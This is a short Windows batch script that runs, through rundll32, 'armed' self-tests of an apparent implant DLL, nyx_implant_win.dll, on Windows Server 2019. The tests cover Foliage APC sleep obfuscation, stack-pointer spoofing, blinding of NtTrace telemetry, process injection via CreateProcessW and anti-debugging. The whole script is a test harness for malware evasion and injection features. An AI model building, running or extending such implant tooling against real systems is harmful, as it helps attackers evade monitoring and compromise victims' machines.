@echo off
rem === Foliage APC + Stack Spoof armed selftests on WS2019 ===

echo === foliage_apc (2s real cycle) ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_foliage_apc
echo foliage_apc=%ERRORLEVEL%

echo === swap_armed (live mov rsp) ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_swap_armed
echo swap_armed=%ERRORLEVEL%

echo === foliage (1s basic) ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_foliage
echo foliage=%ERRORLEVEL%

echo === blind_nttrace re-verify ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_blind_nttrace
echo blind_nttrace=%ERRORLEVEL%

echo === mem (registered regions) ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_mem
echo mem=%ERRORLEVEL%

echo === inject (CreateProcessW) ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_inject
echo inject=%ERRORLEVEL%

echo === antidebug ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_antidebug
echo antidebug=%ERRORLEVEL%
